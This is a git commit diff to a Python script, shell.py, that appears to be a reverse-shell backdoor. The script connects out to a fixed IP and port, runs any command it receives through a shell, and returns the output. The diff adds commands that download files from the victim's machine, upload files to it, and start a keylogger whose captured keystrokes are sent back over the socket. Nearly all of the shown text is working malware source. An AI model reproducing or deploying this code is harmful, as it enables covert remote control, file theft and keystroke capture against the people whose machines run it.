0405226da5a8b6937e5df1fb3f28daae707880de
jasmine-rattan <39281830+jasmine-rattan@users.noreply.github.com>
2020-05-31 21:52:26 -0700

    Update shell.py

--- shell.py
+++ shell.py
@@ -4,6 +4,8 @@ import os
 import subprocess
 import json
 import base64
+import threading
+import keylogger
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -28,11 +30,30 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+        elif command[:8] == "download":
+            with open(command[9:], "rb") as file:
+                reliable_send(base64.b64encode(file.read()))
+        elif command[:6] == "upload":
+            try:
+                with open(command[7:], "wb") as fin:
+                    file_data = reliable_recv()
+                    fin.write(base64.b64decode(file_data))
+            except:
+                failed = "Failed to uplaod file\n"
+                reliable_send(failed)
+        elif command[:12] == "keylog_start":
+            t1 = threading.Thread(target=keylogger.start)
+            t1.start()
+        elif command[:11] == "keylog_dump":
+            fn = open(keylogger_path, "r")
+            reliable_send(fn.read())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
+
+keylogger_path = os.getcwd() + "/keystrokes.txt"
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("10.0.0.74", 54321))
